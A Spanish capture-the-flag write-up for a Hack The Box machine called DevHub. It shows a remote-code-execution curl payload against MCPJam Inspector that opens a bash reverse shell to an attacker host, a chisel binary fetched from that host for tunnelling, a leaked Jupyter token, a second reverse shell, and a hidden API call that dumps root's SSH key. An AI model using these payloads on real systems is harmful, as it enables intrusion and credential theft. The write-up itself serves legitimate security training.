# HTB - DevHub Writeup

**Dificultad:** Medium
**Sistema:** Linux

\---

# Resumen

La máquina **DevHub** presenta una cadena de explotación basada en infraestructura de desarrollo de IA mal configurada. El acceso inicial se obtiene mediante una **RCE conocida (CVE)** en el servicio **MCPJam Inspector v1.4.2**. Desde ahí se realiza pivoteo interno para acceder a una instancia de **Jupyter Notebook** protegida por token (filtrado en un archivo de servicio systemd), y finalmente se escala a root explotando un **endpoint oculto** en una API interna de operaciones (OPSMCP) que permite volcar la clave SSH privada de root.

\---

# Enumeración

## Escaneo inicial

```bash
nmap -sS -sC -sV -T4 devhub.htb
```

### Resultados relevantes:

```
22/tcp   open  ssh
80/tcp   open  http     nginx (redirige a devhub.htb)
6274/tcp open  http     MCPJam Inspector
```

Se agrega la entrada correspondiente en `/etc/hosts`:

```
<IP>    devhub.htb
```

\---

# Análisis Web

Al navegar al puerto **6274**, se identifica el panel de **MCPJam Inspector**, una herramienta de desarrollo/inspección para servidores MCP (Model Context Protocol). La aplicación expone su versión en el HTML:

```
MCPJam Inspector v1.4.2
```

\---

# Vulnerabilidad: RCE en MCPJam Inspector

La versión 1.4.2 de MCPJam Inspector es vulnerable a una **ejecución remota de comandos** a través del endpoint `/api/mcp/connect`, que permite registrar un "servidor MCP" arbitrario cuyo `command` se ejecuta directamente en el sistema.

### Explotación:

```bash
curl http://devhub.htb:6274/api/mcp/connect \\
  --header "Content-Type: application/json" \\
  --data '{"serverConfig":{"command":"bash","args":\["-c","bash -i >\& /dev/tcp/<ATTACKER\_IP>/6969 0>\&1"],"env":{}},"serverId":"pruebaxd"}'
```

Con un listener activo en la máquina atacante:

```bash
nc -lvnp 6969
```

Se obtiene una shell como el usuario **`mcp-dev`**.

\---

# Pivoteo interno: Jupyter Notebook

## Enumeración de puertos locales

Desde la shell de `mcp-dev`, se enumeran los servicios escuchando en loopback:

```bash
ss -tulpn
```

Se identifica un servicio Jupyter en el puerto **8888**, accesible solo desde `127.0.0.1`.

## Port forwarding con Chisel

Como no se dispone de credenciales SSH, se realiza tunneling con **chisel** en modo reverse:

**Atacante (servidor):**

```bash
chisel server -p 8000 --reverse
python3 -m http.server 8080   # para servir el binario chisel
```

**Víctima (cliente, desde la shell de mcp-dev):**

```bash
curl http://<ATTACKER\_IP>:8080/chisel -o /tmp/chisel
chmod +x /tmp/chisel
/tmp/chisel client <ATTACKER\_IP>:8000 R:8888:127.0.0.1:8888
```

## Obtención del token de Jupyter

Se localiza el archivo de servicio systemd correspondiente:

```bash
find / -iname "\*jupyter\*" 2>/dev/null
cat /etc/systemd/system/multi-user.target.wants/jupyter.service
```

### Resultado clave:

```ini
\[Service]
User=analyst
Environment=JUPYTER\_TOKEN=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
ExecStart=/home/analyst/jupyter-env/bin/jupyter lab --ip=127.0.0.1 --port=8888 ...
```

El servicio corre como el usuario **`analyst`**, dueño de la flag de usuario.

## Acceso a JupyterLab

```
http://127.0.0.1:8888/lab?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

\---

# Estabilización de shell como `analyst`

Desde la terminal integrada de JupyterLab se lanza una nueva reverse shell:

```bash
bash -c "bash -i >\& /dev/tcp/<ATTACKER\_IP>/6970 0>\&1"
```

Con un listener previo en la máquina atacante:

```bash
nc -lvnp 6970
```

La shell se estabiliza con el método estándar de PTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

\---

# User Flag

```bash
cat /home/analyst/user.txt
```

\---

# Escalada de Privilegios

## Enumeración

Se localiza un directorio de scripts internos de operaciones:

```bash
find / -iname "server.py" 2>/dev/null
cat /opt/opsmcp/server.py
```

## Análisis de `server.py`

El script implementa una API Flask (**OPSMCP**, puerto 5000, solo loopback) protegida por un header `X-API-Key`. La clave está hardcodeada en el propio código fuente:

```python
VALID\_API\_KEY = "opsmcp\_secret\_key\_4f5a6b7c8d9e0f1a"
```

La API expone herramientas "visibles" (`/tools/list`) y un conjunto de **herramientas ocultas** no listadas pero igualmente invocables vía `/tools/call`, entre ellas:

```python
"ops.\_admin\_dump": {
    "description": "Emergency credential dump - INTERNAL ONLY",
    "parameters": {"target": "string", "confirm": "boolean"}
}
```

Esta función, al recibir `target=ssh\_keys` y `confirm=true`, lee y devuelve directamente el contenido de `/root/.ssh/id\_rsa`.

\---

# Explotación: Volcado de la clave SSH de root

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \\
  -H "X-API-Key: opsmcp\_secret\_key\_4f5a6b7c8d9e0f1a" \\
  -H "Content-Type: application/json" \\
  -d '{"name":"ops.\_admin\_dump","arguments":{"target":"ssh\_keys","confirm":true}}'
```

La respuesta JSON incluye el campo `root\_private\_key` con la clave privada completa de root.

## Guardado de la clave

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \\
  -H "X-API-Key: opsmcp\_secret\_key\_4f5a6b7c8d9e0f1a" \\
  -H "Content-Type: application/json" \\
  -d '{"name":"ops.\_admin\_dump","arguments":{"target":"ssh\_keys","confirm":true}}' \\
  | python3 -c "import sys,json; print(json.load(sys.stdin)\['root\_private\_key'])" > /tmp/root\_id\_rsa

chmod 600 /tmp/root\_id\_rsa
```

## Acceso como root

```bash
ssh -i /tmp/root\_id\_rsa root@127.0.0.1
```

### Verificación

```bash
id
```

Resultado:

```
uid=0(root)
```

\---

# Root Flag

```bash
ssh -i /tmp/root\_id\_rsa root@127.0.0.1 "cat /root/root.txt"
```

\---

# TLDR MUCHO TEXTO

1. Escanea con Nmap → identifica MCPJam Inspector en puerto 6274
2. Explota la RCE conocida de MCPJam v1.4.2 vía `/api/mcp/connect`
3. Obtiene shell como `mcp-dev`
4. Enumera puertos locales → encuentra Jupyter en 8888 (solo loopback)
5. Pivotea con chisel (reverse tunneling) para acceder a Jupyter desde el exterior
6. Encuentra el token de Jupyter en `/etc/systemd/system/jupyter.service`
7. Accede a JupyterLab como `analyst` y lanza una reverse shell estable
8. Lee la flag de usuario
9. Encuentra `server.py` (API interna OPSMCP) con API key hardcodeada
10. Descubre un endpoint oculto (`ops.\_admin\_dump`) que vuelca la clave SSH de root
11. Usa la clave para autenticarse por SSH como root
12. Lee la flag de root

\---

# Conclusión

Esta máquina demuestra cómo una combinación de:

* Herramientas de desarrollo de IA expuestas externamente con vulnerabilidades públicas (MCPJam Inspector)
* Credenciales/tokens hardcodeados en archivos de configuración de servicios (systemd)
* APIs internas con funcionalidad "oculta" no documentada pero accesible
* Claves de API embebidas directamente en el código fuente puede llevar a un compromiso total del sistema, desde un punto de entrada aparentemente aislado hasta la obtención de privilegios de root.

\---

y ya

